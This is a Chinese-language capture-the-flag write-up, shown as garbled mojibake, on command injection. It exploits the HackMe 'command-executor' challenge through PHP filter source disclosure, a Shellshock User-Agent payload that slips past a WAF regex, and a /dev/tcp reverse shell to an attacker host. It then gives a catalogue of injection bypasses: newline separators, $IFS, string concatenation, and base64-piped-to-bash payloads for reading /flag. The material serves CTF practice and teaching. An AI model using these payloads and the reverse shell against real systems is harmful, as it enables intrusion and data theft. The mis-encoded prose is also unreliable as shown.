&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami Linuxï¼š | ç®¡é“ç¬¦ï¼Œæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœ ping 127.0.0.1|whoami || å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„ ping 1||whoami &amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami &amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami hackme command executor é¢˜ç›®åœ°å€ï¼šcommand-executorâ€”â€”æ¥æºäº HackMe é¢˜ç›®æ¶‰åŠåˆ°çš„è€ƒå¯Ÿç‚¹ï¼š æ–‡ä»¶åŒ…å«è¯»æºç  ä»£ç åˆ†æï¼ˆPHPï¼ŒCï¼‰ CVE shellshock åå¼¹shell Linuxä¸‹è¾“å‡ºè¾“å…¥é‡å®šå‘ é¦–å…ˆé¢˜ç›®æä¾›äº†å‡ ä¸ªæ¨¡å—ï¼Œç¬¬ä¸€ä¸ªæ˜¯manå‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£ï¼š é€‰æ‹©äº†bashå‚æ•°å‘ç°å¤šäº†ä¸€ä¸ªfile=bashçš„è¯·æ±‚å‚æ•°ï¼Œå°è¯•ä½¿ç”¨å…¶ä»–å‘½ä»¤ï¼Œæ¯”å¦‚ï¼špwd çŒœæµ‹eval(&quot;man /bin/&quot; + command)æˆ–è€…ä¸€äº›å…¶ä»–çš„ç›®å½•ã€‚ Tar Testerç•Œé¢å¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…ä½†æ˜¯å¹¶æ²¡æœ‰è§£å‹ï¼Œåªæ˜¯tar -tvf test.taræŸ¥çœ‹å‹ç¼©åŒ…å†…çš„å†…å®¹ã€‚ Cmd Execåªèƒ½æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ï¼šlsã€envã€‚ List Fileså¯ä»¥åˆ—ä¸¾å‡ ä¸ªç›®å½•ã€‚ å†è§‚å¯Ÿé¢˜ç›®urlçš„å½¢å¼ï¼šhttps://command-executor.hackme.inndy.tw/index.php?func=untarç­‰å‡å¸¦æœ‰func=xxxå‚æ•°æ¥å±•ç¤ºé¡µé¢ï¼ŒçŒœæµ‹ä¼šæœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°è¯•ä½¿ç”¨func=php://filter/read=convert.base64-encode/resource=indexè¯»å–æ–‡ä»¶å†…å®¹ï¼ŒæˆåŠŸå¾—åˆ°å›æ˜¾ï¼š æˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬åˆ†åˆ«æŠŠä¸»é¡µå’Œå…¶ä»–å››ä¸ªæ¨¡å—çš„PHPæºç ä¸‹è½½ä¸‹æ¥ï¼š 123456789101112131415import requestsimport codecsimport base64from bs4 import BeautifulSoupurl=&quot;https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=&quot;file_list = [&quot;index&quot;,&quot;man&quot;,&quot;untar&quot;,&quot;ls&quot;,&quot;cmd&quot;]for i in file_list: res = requests.get(url+i) print(&quot;dowload &quot;+i) if res.status_code==200: res.encoding=&quot;utf8&quot; with codecs.open(i+&quot;.php&quot;,&quot;w+&quot;,&quot;utf8&quot;) as handle: print(&quot;done&quot;) text = BeautifulSoup(res.text,&quot;lxml&quot;).text.split(&#x27;\\n&#x27;)[0] handle.write(base64.b64decode(text).decode(&#x27;utf8&#x27;)) index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;?php$pages = [ [&#x27;man&#x27;, &#x27;Man&#x27;], [&#x27;untar&#x27;, &#x27;Tar Tester&#x27;], [&#x27;cmd&#x27;, &#x27;Cmd Exec&#x27;], [&#x27;ls&#x27;, &#x27;List files&#x27;],];function fuck($msg) &#123; header(&#x27;Content-Type: text/plain&#x27;); echo $msg; exit;&#125;$black_list = [ &#x27;\\/flag&#x27;, &#x27;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#x27;];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123; fuck(&quot;$b detected! exit now.&quot;); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell=&#x27;bash&#x27;) &#123; system(sprintf(&#x27;%s -c %s&#x27;, $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === &#x27;HTTP_&#x27;) &#123; putenv(&quot;$key=$val&quot;); &#125;&#125;$page = &#x27;&#x27;;if(isset($_GET[&#x27;func&#x27;])) &#123; $page = $_GET[&#x27;func&#x27;]; if(strstr($page, &#x27;..&#x27;) !== false) &#123; $page = &#x27;&#x27;; &#125;&#125;if($page &amp;&amp; strlen($page) &gt; 0) &#123; try &#123; include(&quot;$page.php&quot;); &#125; catch (Exception $e) &#123; &#125;&#125;function render_default() &#123; ?&gt;&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;&lt;?php &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Command Executor&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt; &lt;style&gt; nav &#123; margin-bottom: 1rem; &#125; img &#123; max-width: 100%; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt; &lt;ul class=&quot;navbar-nav&quot;&gt;&lt;?php foreach($pages as list($file, $title)): ?&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt; &lt;/li&gt;&lt;?php endforeach; ?&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&#x27;render&#x27;)) render(); else render_default(); ?&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; man.php 123456789101112131415161718192021222324252627282930&lt;?phpfunction render() &#123; $file = &#x27;man&#x27;; if(isset($_GET[&#x27;file&#x27;])) &#123; $file = (string)$_GET[&#x27;file&#x27;]; if(preg_match(&#x27;/^[\\w\\-]+$/&#x27;, $file) !== 1) &#123; echo &#x27;&lt;pre&gt;Invalid file name!&lt;/pre&gt;&#x27;; return; &#125; &#125; echo &#x27;&lt;h1&gt;Online documents&lt;/h1&gt;&#x27;; $cmds = [ &#x27;bash&#x27;, &#x27;ls&#x27;, &#x27;cp&#x27;, &#x27;mv&#x27; ]; echo &#x27;&lt;ul&gt;&#x27;; foreach($cmds as $cmd) &#123; printf(&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=man&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;, $cmd); &#125; echo &#x27;&lt;/ul&gt;&#x27;; printf(&#x27;&lt;h2&gt;$ man %s&lt;/h2&gt;&#x27;, htmlentities($file)); echo &#x27;&lt;pre&gt;&#x27;; execute(sprintf(&#x27;man %s | cat&#x27;, escapeshellarg($file))); echo &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; untar.php 1234567891011121314151617181920212223&lt;?phpfunction render() &#123;?&gt;&lt;h1&gt;Tar file tester&lt;/h1&gt;&lt;p&gt;Please upload a tar file to test&lt;/p&gt;&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php?func=untar&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;tarfile&quot; id=&quot;tarfile&quot;&gt; &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Upload &amp;amp; Test&quot;&gt;&lt;/form&gt;&lt;?php if(isset($_FILES[&#x27;tarfile&#x27;])) &#123; printf(&#x27;&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;&#x27;, htmlentities($_FILES[&#x27;tarfile&#x27;][&#x27;name&#x27;])); echo &#x27;&lt;pre&gt;&#x27;; execute(sprintf(&#x27;tar -tvf %s 2&gt;&amp;1&#x27;, escapeshellarg($_FILES[&#x27;tarfile&#x27;][&#x27;tmp_name&#x27;]))); echo &#x27;&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; cmd.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction render() &#123; $cmd = &#x27;&#x27;; if(isset($_GET[&#x27;cmd&#x27;])) &#123; $cmd = (string)$_GET[&#x27;cmd&#x27;]; &#125;?&gt;&lt;h1&gt;Command Execution&lt;/h1&gt;&lt;?php echo &#x27;&lt;ul&gt;&#x27;; $cmds = [&#x27;ls&#x27;, &#x27;env&#x27;]; foreach($cmds as $c) &#123; printf(&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=cmd&amp;cmd=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;, $c); &#125; echo &#x27;&lt;/ul&gt;&#x27;;?&gt;&lt;form action=&quot;index.php&quot; method=&quot;GET&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;func&quot; value=&quot;cmd&quot;&gt; &lt;div class=&quot;input-group&quot;&gt; &lt;input class=&quot;form-control&quot; type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;cmd&quot;&gt; &lt;div class=&quot;input-group-append&quot;&gt; &lt;input class=&quot;btn btn-primary&quot; type=&quot;submit&quot; value=&quot;Execute&quot;&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt;&lt;script&gt;cmd.focus();&lt;/script&gt;&lt;?php if(strlen($cmd) &gt; 0) &#123; printf(&#x27;&lt;h2&gt;$ %s&lt;/h2&gt;&#x27;, htmlentities($cmd)); echo &#x27;&lt;pre&gt;&#x27;; switch ($cmd) &#123; case &#x27;env&#x27;: case &#x27;ls&#x27;: case &#x27;ls -l&#x27;: case &#x27;ls -al&#x27;: execute($cmd); break; case &#x27;cat flag&#x27;: echo &#x27;&lt;img src=&quot;cat-flag.png&quot; alt=&quot;cat flag&quot;&gt;&#x27;; break; default: printf(&#x27;%s: command not found&#x27;, htmlentities($cmd)); &#125; echo &#x27;&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; ls.php 1234567891011121314151617181920212223&lt;?phpfunction render() &#123; $file = &#x27;.&#x27;; if(isset($_GET[&#x27;file&#x27;])) &#123; $file = (string)$_GET[&#x27;file&#x27;]; &#125; echo &#x27;&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;&#x27;; echo &#x27;&lt;ul&gt;&#x27;; $dirs = [&#x27;.&#x27;, &#x27;..&#x27;, &#x27;../..&#x27;, &#x27;/etc/passwd&#x27;]; foreach($dirs as $dir) &#123; printf(&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=ls&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;, $dir); &#125; echo &#x27;&lt;/ul&gt;&#x27;; printf(&#x27;&lt;h2&gt;$ ls %s&lt;/h2&gt;&#x27;, htmlentities($file)); echo &#x27;&lt;pre&gt;&#x27;; execute(sprintf(&#x27;ls -l %s&#x27;, escapeshellarg($file))); echo &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ls.phpæ¥æ‰¾flagäº†ï¼Œå› ä¸ºls.phpæ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨func=ls&amp;file=../../../å¯ä»¥å‘ç°æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘æ€ä¹ˆè¯»flagã€flag-readerå’Œflag-reader.cè¿™ä¸‰ä¸ªæ–‡ä»¶äº†ã€‚ untar.phpé»˜è®¤æ‰§è¡Œtar -tvfå‘½ä»¤æ²¡æœ‰å¯åˆ©ç”¨çš„åœ°æ–¹ï¼Œman.phpæœ‰ç”¨æˆ·å¯æ§åˆ¶çš„å‚æ•°fileï¼Œä½†æ˜¯preg_match('/^[\\w\\-]+$/', $file) !== 1é™åˆ¶çš„æ¯”è¾ƒæ­»ï¼Œè€Œcmd.phpç»™å‡ºäº†envå‘½ä»¤ï¼Œæ˜¾ç¤ºäº†å½“å‰bashçš„ç¯å¢ƒå˜é‡ï¼Œè€Œä¸”ï¼Œåœ¨index.phpä¸­ä¹Ÿæœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„PHPå‡½æ•°putenvï¼š æ¯”è¾ƒå®¹æ˜“è®©äººæƒ³åˆ°ä¹Ÿå¯ä»¥æ¯”è¾ƒå®¹æ˜“æœåˆ°ShellShockæ¼æ´ã€‚ Bashç ´å£³æ¼æ´åŸç†ä»‹ç» 123456789101112131415161718192021222324252627282930313233$black_list = [ &#x27;\\/flag&#x27;, &#x27;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#x27;];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123; fuck(&quot;$b detected! exit now.&quot;); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell=&#x27;bash&#x27;) &#123; system(sprintf(&#x27;%s -c %s&#x27;, $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === &#x27;HTTP_&#x27;) &#123; putenv(&quot;$key=$val&quot;); &#125;&#125; å…³é”®å°±åœ¨putenvå‡½æ•°ï¼Œç”±äºShellShockæ¼æ´ padyload éœ€è¦å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨putenvå®ç°å‚æ•°ä¼ é€’ï¼Œç›´æ¥è®¾ç½®User-agent: () &#123; :;&#125;; echo 222222ï¼Œå‘ç°è¢« wafã€‚ ä»æœ€åä¸€ä¸ªforeachä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä¼šæŠŠä»¥HTTP_å¼€å¤´çš„å…ƒç´ è®¾ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œåœ¨ä¸€æ¬¡HTTPè¯·æ±‚ä¸­ï¼Œæœ‰å¦‚ä¸‹å­—æ®µç¬¦åˆè¦æ±‚ï¼š HTTP_ACCEPT_LANGUAGE: zh-CN,zh;q=0.9 HTTP_ACCEPT_ENCODING: gzip, deflate, br HTTP_SEC_FETCH_MODE: navigate HTTP_SEC_FETCH_SITE: cross-site HTTP_ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 HTTP_SEC_FETCH_USER: ?1 HTTP_USER_AGENT: test HTTP_UPGRADE_INSECURE_REQUESTS: 1 HTTP_CACHE_CONTROL: max-age=0 HTTP_CONNECTION: keep-alive HTTP_HOST: localhost è¿™é‡Œé¢HTTP_USER_AGENTæ¯”è¾ƒå¥½åˆ©ç”¨ã€‚ æŸ¥çœ‹è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå‘ç°å¯ä»¥åœ¨ä¸­é—´çš„&#125;;ä¸­é—´åŠ ä¸€ä¸ªç©ºæ ¼ç»•è¿‡ï¼Œå³User-agent: () &#123; : ;&#125;; echo test å¯ä»¥æ­£å¸¸å›æ˜¾ï¼Œå†å›æ¥çœ‹é‚£ä¸‰ä¸ªæ–‡ä»¶ï¼Œflagéœ€è¦rootæƒé™è¯»ï¼Œé‚£ä¹ˆå…ˆä»flag-reader.cä¸‹æ‰‹ï¼Œè®¾ç½®User-Agent: () &#123; : ;&#125;; cat /?lag-reader.cï¼Œå‘ç°flagè¢«å±è”½ï¼Œä½¿ç”¨*é€šé…ç¬¦ç»•è¿‡ï¼š() &#123; : ;&#125;; /bin/cat /fla*.cï¼Œè¯»åˆ°flag-reader.cæ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char buff[4096], rnd[16], val[16]; if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123; write(1, &quot;Not enough random\\n&quot;, 18); &#125; setuid(1337); seteuid(1337); alarm(1); write(1, &amp;rnd, sizeof(rnd)); read(0, &amp;val, sizeof(val)); if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123; int fd = open(argv[1], O_RDONLY); if(fd &gt; 0) &#123; int s = read(fd, buff, 1024); if(s &gt; 0) &#123; write(1, buff, s); &#125; close(fd); &#125; else &#123; write(1, &quot;Can not open file\\n&quot;, 18); &#125; &#125; else &#123; write(1, &quot;Wrong response\\n&quot;, 16); &#125;&#125; å®¡è®¡è¿™ä¸ªCæºç¨‹åºï¼Œå¤§è‡´åŸç†å°±æ˜¯ï¼š1ç§’ä¹‹å†…æŠŠä»–è¾“å‡ºçš„éšæœºå­—ç¬¦ä¸²å†è¾“å…¥å›å»ï¼Œå°±å¯ä»¥æ‰“å‡ºæ–‡ä»¶å†…å®¹ã€‚ æ‰€ä»¥ç›®æ ‡å°±æ˜¯é€šè¿‡flag-reader flagå‘½ä»¤æ¥è¯»å–flagæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellå’Œé‡å®šå‘æ¥è¾¾åˆ°è¿™ç›®çš„ï¼Œæˆ‘ä»¬å°†è¾“å‡ºå†™åˆ°æŸä¸ªæ–‡ä»¶ä¸­ï¼Œå†è‡ªåŠ¨è¾“å…¥å³å¯ã€‚ å…ˆé˜¿é‡Œäº‘ä¸Šç›‘å¬11000ç«¯å£ï¼Œå†åˆ©ç”¨shellshockæ¼æ´æ‰§è¡Œ() &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1 åå¼¹shellå¯ä»¥çœ‹è¿™é‡Œ åå¼¹shellè¿™é‡Œå¡äº†æˆ‘ä¸€å¤©çš„æ—¶é—´ï¼Œå‘½ä»¤åº”è¯¥æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œä½†æ˜¯å°±æ˜¯åœ¨é˜¿é‡Œäº‘ä¸»æœºä¸Šæ²¡æœ‰å›æ˜¾ï¼Œæœ€åå‘ç°ä¸ä»…è¦é…ç½®å®‰å…¨ç»„è¿˜è¦åœ¨centosä¸Šå¯¹å¼€æ”¾è¿™ä¸ªç«¯å£çš„é˜²ç«å¢™ã€‚ æˆ‘ä»¬å†å»æ‰¾å¯å†™ç›®å½•ï¼Œå‘ç° /var/tmpå…·æœ‰å†™æƒé™ æˆ‘ä»¬å†æ„é€ payloadï¼š() &#123; : ; &#125;; flag-reader flag &gt; /var/tmp/ca01h &lt; /var/tmp/ca01hï¼ŒæŸ¥çœ‹cat ca01hï¼Œå¾—åˆ°flagï¼š å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æ–¹å¼ ç©ºæ ¼è¿‡æ»¤ ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä»£æ›¿ï¼š %20(space)ã€%09(tab)ã€$IFS$9ã€ $&#123;IFS&#125; $IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„cat$IFS2,bashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œç„¶è€Œå¦‚æœåŠ ä¸€ä¸ª&#123;&#125;å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨$9å‘¢ï¼Œå› ä¸º$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚ ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦ 12linuxä¸­ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||windowsä¸­ï¼š%0aã€&amp;ã€|ã€%1aï¼ˆä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰ åœ¨ shell ä¸­ï¼Œæ‹…ä»»è¿ç»­æŒ‡ä»¤åŠŸèƒ½çš„ç¬¦å·å°±æ˜¯;ã€‚ &amp;æ”¾åœ¨å¯åŠ¨å‚æ•°åé¢è¡¨ç¤ºè®¾ç½®æ­¤è¿›ç¨‹ä¸ºåå°è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿›ç¨‹æ˜¯å‰å°è¿›ç¨‹ï¼Œè¿™æ—¶å°±æŠŠShellç»™å æ®äº†ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œå…¶ä»–æ“ä½œï¼Œå¯¹äºé‚£äº›æ²¡æœ‰äº¤äº’çš„è¿›ç¨‹ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›å°†å…¶åœ¨åå°å¯åŠ¨ï¼Œå¯ä»¥åœ¨å¯åŠ¨å‚æ•°çš„æ—¶å€™åŠ ä¸€ä¸ª&amp;å®ç°è¿™ä¸ªç›®çš„ã€‚ ç®¡é“ç¬¦&quot;|&quot;å·¦è¾¹å‘½ä»¤çš„è¾“å‡ºå°±ä¼šä½œä¸ºç®¡é“ç¬¦å³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œæ‰€ä»¥å·¦è¾¹çš„è¾“å‡ºå¹¶ä¸æ˜¾ç¤ºã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå®ä¾‹ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š 12345678&lt;?php $file_name = $_GET[&quot;path&quot;]; if(!preg_match(&quot;/^[\\/a-zA-Z0-9-_\\\\s]+.rpt$/m&quot;, $file_name)) &#123; echo &quot;regex failed&quot;; &#125; else &#123; echo exec(&quot;/usr/bin/file -i -b &quot; . $file_name); &#125; ?&gt; è¿™ä¸ªç¨‹åºçš„å«ä¹‰å°±æ˜¯åŒ¹é…æ–‡ä»¶åç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€ç ´åˆ™å·ã€æ–œæ ã€ç©ºç™½å­—ç¬¦å„ç§ç»„åˆçš„å¹¶ä¸”åç¼€åæ˜¯rptçš„æ–‡ä»¶ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œå°±æ‰§è¡Œç³»ç»Ÿå‘½ä»¤fileæ‰“å°æ–‡ä»¶çš„ç±»å‹å’Œç¼–ç ä¿¡æ¯ï¼Œå¦‚æœåŒ¹é…å¤±è´¥å°±æ‰“å°â€™regex failedâ€™ã€‚ æ”»å‡»ç‚¹åœ¨\\\\sæ­£åˆ™è¿‡æ»¤ä¸Šï¼Œ\\\\s æ„æ€æ˜¯åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼Œä½•ä¸ºç©ºç™½å­—ç¬¦ï¼Œå°±æ˜¯å¸¸è§çš„[trnf] (Tabã€å›è½¦ã€æ¢è¡Œã€æ¢é¡µ)ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œè¿™é‡Œæ¢è¡Œç¬¦å°±å¾ˆå±é™©ï¼Œæ¢è¡Œç¬¦åœ¨å…¶ä»–åœºæ™¯å¯èƒ½æ²¡æœ‰é£é™©ï¼Œä½†æ˜¯åœ¨shellç¯å¢ƒä¸‹ï¼Œå°±æœ‰å¯èƒ½é€ æˆå‘½ä»¤æ³¨å…¥ï¼Œçœ‹çœ‹ä¸‹é¢è¿™æ®µpayloadï¼š 1file%0aid%0a.rpt %0aæ˜¯URLç¼–ç åçš„æ¢è¡Œç¬¦ï¼Œåœ¨shellçš„ç¯å¢ƒä¸­æ‰§è¡Œï¼š å› ä¸ºåœ¨shellç¯å¢ƒä¸­å¤šä¸ªå‘½ä»¤çš„åˆ†éš”ç¬¦é™¤äº†;ä¹‹å¤–è¿˜æœ‰æ¢è¡Œç¬¦ï¼Œä¸Šè¿°payload ä¼ å…¥shellä¹‹åï¼Œå°±å˜æˆä¸¤æ¡å‘½ä»¤æ‰§è¡Œï¼š 123file -i -b file%0Aid%0A.rpt æ‰€ä»¥å°±å‡ºç°äº†æ‰“å°idå‘½ä»¤æ‰§è¡Œçš„å†…å®¹ã€‚ è¦è§£å†³è¿™ä¸ªç»•è¿‡å¯ä»¥æŠŠ\\\\sç›´æ¥æ¢æˆç©ºæ ¼ï¼Œå³preg_match(&quot;/^[\\/a-zA-Z0-9-_ ]+.rpt$/m&quot;, $file_name)ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥æ„é€ payloadæ¥æ³¨å…¥å‘½ä»¤ï¼š 1file.rpt%0aid åœ¨phpä¸­ï¼Œ/mè¡¨ç¤ºå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ï¼Œå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ä¹‹å^å’Œ$çš„å«ä¹‰å°±å‘ç”Ÿäº†å˜åŒ–ï¼Œæ²¡å¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹å‰(å³å•è¡ŒåŒ¹é…æ¨¡å¼), ^ å’Œ$ æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾ï¼Œå¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹åï¼Œå¤šè¡Œæ¨¡å¼^,$å¯ä»¥åŒ¹é…æ¯è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œæ‰€ä»¥ä¸Šè¿°payloadé‡Œé¢å«æœ‰æ¢è¡Œç¬¦ï¼Œè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œä¸€è¡ŒåŒ¹é…OKå³å¯ï¼Œæ‰€ä»¥è¿›å…¥äº†execæ‰§è¡Œåˆ†æ”¯ï¼Œè¿›è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ èŠ±æ‹¬å·çš„å…¶ä»–ç”¨æ³• åœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨&#123;OS_COMMAND,ARGUMENT&#125;æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š é»‘åå•ç»•è¿‡ æ‹¼æ¥ç»•è¿‡ a=l;b=s;$a$b ç›´æ¥å‚è€ƒä¸€é“ä»£ç å®¡è®¡çš„é¢˜ç›® 123456789101112131415161718192021222324252627&lt;center&gt;&lt;h2&gt;calc&lt;&#x2F;h2&gt;&lt;?php$str&#x3D;&quot;&quot;;if(!empty($_GET))&#123; $str&#x3D;$_GET[&quot;calc&quot;]; if(strpos($str,&quot;#&quot;)!&#x3D;&#x3D;false) die; if(strpos($str,&quot;&#96;&quot;)!&#x3D;&#x3D;false) die; if(strpos($str,&quot;flag&quot;)!&#x3D;&#x3D;false) die;&#125;?&gt;&lt;form action&#x3D;&quot;.&#x2F;index.php&quot;&gt;input: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;calc&quot; value&#x3D;&quot;&lt;?php echo $str;?&gt;&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;&lt;&#x2F;form&gt;&lt;?php echo &quot;result:&quot;.shell_exec(&quot;echo $str | bc&quot;);?&gt;&lt;&#x2F;center&gt;&lt;?phpshow_source(__FILE__); è¿™é‡Œè¿‡æ»¤äº†&quot;#ã€`â€œå’Œ&quot;flagâ€ payloadï¼š?calc=1;a=fl;b=ag;cat $a$b;1 ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡flagï¼Œç”¨;ç»•è¿‡| bc ç¼–ç ç»•è¿‡ base64ï¼š 12echo MTIzCg&#x3D;&#x3D;|base64 -d å…¶å°†ä¼šæ‰“å°123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag hexï¼š 1echo &quot;636174202f666c6167&quot; 